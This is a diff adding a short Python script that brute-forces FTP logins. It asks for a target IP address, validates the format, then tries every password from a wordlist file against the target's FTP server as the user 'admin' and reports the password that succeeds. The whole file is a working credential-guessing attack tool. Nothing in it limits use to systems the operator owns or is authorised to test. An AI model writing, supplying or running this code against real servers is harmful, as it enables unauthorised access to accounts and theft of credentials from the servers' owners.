@@ -1,0 +1,47 @@
+import re
+from ftplib import FTP
+
+def validate_ip(ip):
+    # Validate IP address format
+    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+    if re.match(pattern, ip):
+        parts = ip.split('.')
+        return all(0 <= int(part) <= 255 for part in parts)
+    return False
+
+def get_target_ip():
+    # Get and validate target IP from user
+    while True:
+        ip = input("Enter target IP address: ")
+        if validate_ip(ip):
+            return ip
+        else:
+            print("ERROR: Invalid IP address format. Please provide a valid IP.")
+
+def bruteforce_ftp(target_ip, username="admin", wordlist_path="senhas.txt"):
+    # Attempt FTP brute force with error handling
+    try:
+        with open(wordlist_path, "r") as file:
+            passwords = file.readlines()
+    except FileNotFoundError:
+        print(f"ERROR: Wordlist file '{wordlist_path}' not found.")
+        return False
+    
+    for password in passwords:
+        password = password.strip()
+        try:
+            ftp = FTP(target_ip)
+            ftp.login(user=username, passwd=password)
+            print(f"[+] Login successful! Password found: {password}")
+            ftp.quit()
+            return True
+        except Exception as e:
+            print(f"[-] Failed login with: {password} ({str(e)})")
+    
+    print("[-] Brute force failed - no valid credentials found.")
+    return False
+
+# Main execution
+if __name__ == "__main__":
+    target_ip = get_target_ip()
+    bruteforce_ftp(target_ip)
